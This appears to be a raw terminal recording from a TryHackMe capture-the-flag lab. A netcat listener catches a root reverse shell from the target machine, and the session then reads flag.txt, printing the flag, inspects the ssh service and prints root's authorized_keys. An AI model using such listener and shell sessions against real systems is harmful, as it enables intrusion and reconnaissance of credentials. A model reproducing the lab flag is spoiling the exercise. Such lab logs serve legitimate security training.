@@ -1,0 +1,73 @@
+Script started on 2026-02-15 16:03:06+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="105" LINES="24"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.27.202.214] from (UNKNOWN) [172.27.192.1] 59493
+root@tryhackme-2204:/opt/Speed_Chat# [Kroot@tryhackme-2204:/opt/Speed_Chat# [?2004l
+
+Script done on 2026-02-15 16:10:29+03:00 [COMMAND_EXIT_CODE="0"]
+Script started on 2026-02-15 16:11:06+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="105" LINES="24"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.27.202.214] from (UNKNOWN) [172.27.192.1] 52692
+bash: cannot set terminal process group (413): Inappropriate ioctl for device
+[Kbash: no job control in this shell
+root@tryhackme-2204:/opt/Speed_Chat# [Kroot@tryhackme-2204:/opt/Speed_Chat# [K[?2004hroot@tryhackme-2204:/opt/Speed_Chat# ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+app.py
+flag.txt
+uploads
+root@tryhackme-2204:/opt/Speed_Chat# [Kroot@tryhackme-2204:/opt/Speed_Chat# [K[?2004hroot@tryhackme-2204:/opt/Speed_Chat# cat fl     [Kag.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat flag.txt
+[Kcat flag.txt[Kcat flag.txt[Kcat flag.txt
+THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}root@tryhackme-2204:/opt/Speed_Chat# [KTHM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}root@tryhackme-2204:/opt/Speed_Chat# [K[?2004hTHM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}root@tryhackme-2204:/opt/Speed_Chat# su[Kyste,[Kmctl status ssh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsystemctl status ssh
+[Ksystemctl status ssh[Ksystemctl status ssh[Ksystemctl status ssh
+● ssh.service - OpenBSD Secure Shell server
+     Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)
+    Drop-In: /usr/lib/systemd/system/ssh.service.d
+             └─ec2-instance-connect.conf
+     Active: active (running) since Sun 2026-02-15 12:53:51 UTC; 20min ago
+       Docs: man:sshd(8)
+             man:sshd_config(5)
+   Main PID: 716 (sshd)
+      Tasks: 1 (limit: 2305)
+     Memory: 2.9M
+        CPU: 29ms
+     CGroup: /system.slice/ssh.service
+             └─716 "sshd: /usr/sbin/sshd -D -o AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys %u %f -o AuthorizedKeysCommandUser ec2-instance-connect [listener] 0 of 10-100 startups"
+
+Feb 15 12:53:51 tryhackme-2204 systemd[1]: Starting OpenBSD Secure Shell server...
+Feb 15 12:53:51 tryhackme-2204 sshd[716]: Server listening on 0.0.0.0 port 22.
+Feb 15 12:53:51 tryhackme-2204 sshd[716]: Server listening on :: port 22.
+Feb 15 12:53:51 tryhackme-2204 systemd[1]: Started OpenBSD Secure Shell server.
+root@tryhackme-2204:/opt/Speed_Chat# [Kroot@tryhackme-2204:/opt/Speed_Chat# [K[?2004hroot@tryhackme-2204:/opt/Speed_Chat# cd[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd
+[Kcd[Kcd[Kcd
+root@tryhackme-2204:~# [Kroot@tryhackme-2204:~# [K[?2004hroot@tryhackme-2204:~# pwd[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hpwd
+[Kpwd[Kpwd[Kpwd
+/root
+root@tryhackme-2204:~# [Kroot@tryhackme-2204:~# [K[?2004hroot@tryhackme-2204:~# ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 32
+drwx------  6 root root 4096 Jan 27 13:23 .
+drwxr-xr-x 19 root root 4096 Feb 15 12:53 ..
+-rw-------  1 root root    0 Oct 22  2024 .bash_history
+-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
+drwxr-xr-x  3 root root 4096 Jan 27 13:23 .cache
+drwxr-xr-x  3 root root 4096 Oct 22  2024 .local
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+drwx------  2 root root 4096 Oct 22  2024 .ssh
+drwxr-xr-x  4 root root 4096 Oct 22  2024 snap
+root@tryhackme-2204:~# [Kroot@tryhackme-2204:~# [K[?2004hroot@tryhackme-2204:~# cd .ssh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd .ssh
+[Kcd .ssh[Kcd .ssh[Kcd .ssh
+root@tryhackme-2204:~/.ssh# [Kroot@tryhackme-2204:~/.ssh# [K[?2004hroot@tryhackme-2204:~/.ssh# ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 12
+drwx------ 2 root root 4096 Oct 22  2024 .
+drwx------ 6 root root 4096 Jan 27 13:23 ..
+-rw------- 1 root root 1696 Feb 15 12:53 authorized_keys
+root@tryhackme-2204:~/.ssh# [Kroot@tryhackme-2204:~/.ssh# [K[?2004hroot@tryhackme-2204:~/.ssh# cat au      [Kthorized_keys[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat authorized_keys
+[Kcat authorized_keys[Kcat authorized_keys[Kcat authorized_keys
+no-port-forwarding,no-agent-forwarding,no-X11-forwarding,command="echo 'Please login as the user \"ubuntu\" rather than the user \"root\".';echo;sleep 10;exit 142" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCKRBDPIgwf5ZmB7TXfzkL6BD94dEqBYggDlk0Yzr00w22mJgSeGmuvKVTrwOpKsV40MZLOP45nfBTnCov8N2shzeEU5lGj6Psz9IUeU2S+sNxmdn8Ooyy1BkbfBODrGWiUqmRMAizZpVPeOdkPHVw+k3ln1zmlg7PeFYmEye5p00Ufi4wd9iIpjxc7mmHMj/UhS4Hk0PBL2G4kFwBJMd/oOGRz1OEKUXeYQgv+9JqCUkXCUNh0GKkbVCWL/nDd3J4FNqPBurAS4AZSqn7n1E/dZEXg2sICKoFc+kg47SN81Jbjc4ohU7oYrBi6CpynMdMpS4jIWBebU6Arq9Ezbn4b cmnatic
+no-port-forwarding,no-agent-forwarding,no-X11-forwarding,command="echo 'Please login as the user \"ubuntu\" rather than the user \"root\".';echo;sleep 10;exit 142" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQib8tAERvusE/zyHwdfwYXQnyeB17nWWFFknnlojMI+fNocC+nGUt/acK+eFEbDzf3eSon+I9+ceebbcCSw36EOsSHlZZ+4kvSCvJ74jctk9M9m/YoXmi4v6F8MfL9dX/71wX3X7fBODpfHIpsuuqxl7CWJzoY+MSayxsGoFyZZs9E8AUerseCiEXA7o/8K5MxaLFsLPTeJ3fQot8o468xieOONrkL5/0IwBWP497CmTi4AAK55OTAqW1e8W1qou4fubrcy1pdyccNIii5LZx/fTO9VK2jrtUkTnWrZ+dHQH9u3DiHbMSK88sOvxWdoKAly3cABFSglhP5kxFMZH3 kohzmik@content-dev-internal-last
+no-port-forwarding,no-agent-forwarding,no-X11-forwarding,command="echo 'Please login as the user \"ubuntu\" rather than the user \"root\".';echo;sleep 10;exit 142" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeF98Q1NGUdo/Uml2mBruvB0NeAg/l986wqR38WVxOL3jxXnDL8B/+K5+mPHf2yg3ZEqkrqWM3ZJCyH9P/K2IvkQD9LmHNucYVh9Be2Hhz/Qr62e/181NPLKwum2hdBqSb1FGkCuN/M77hSkOQ4N/BYnw7Mxtkjw8EJWbZNLNEr+CDOgeIuQvr+NP6V/2sIuy3aKeB9/17oT9k8h2jcAPndKOBv7bkfXvAAAuphnZX+sEXJbZ42jvJt/QLDVZdrDDe3wTSi3qRxTKCpdYrmBqtd6Lk7p5DoQGvrSPOptFgw+/4JgQQzuPY7zmp5GfJUt6MdVZlGN6K+btw379OKJZZ eu-west-1-vuln-vms
+root@tryhackme-2204:~/.ssh# [Kroot@tryhackme-2204:~/.ssh# [K[?2004hroot@tryhackme-2204:~/.ssh# exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[?2004l
+Script done on 2026-02-15 16:14:43+03:00 [COMMAND_EXIT_CODE="0"]
